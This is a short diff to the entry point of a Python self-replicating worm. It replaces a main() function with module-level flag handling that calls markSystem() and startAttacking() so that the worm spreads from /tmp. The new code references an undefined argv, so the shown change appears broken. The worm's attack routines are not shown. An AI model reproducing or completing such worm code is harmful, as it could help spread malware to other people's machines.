@@ -143,21 +143,14 @@ def startAttacking(wormLocation, isHost):
 			print("Could not spread to this host: %s" %(str(Host)))
 	
 	
-def main(argv):
-
-	if argv[1] == "-h":
-		print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n")
-	elif argv[1] == "-host":
-		startAttacking("replicating_worm.py", True)
-	else:
-		markSystem()
-		startAttacking("/tmp/replicating_worm.py", False)
-	
-
-
-
-if __name__ == "__main__":
-	main(sys.argv)
+if argv[1] == "-h":
+	print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n")
+elif argv[1] == "-host":
+	markSystem()
+	startAttacking("replicating_worm.py", True)
+else:
+	markSystem()
+	startAttacking("/tmp/replicating_worm.py", False)
 
 
 
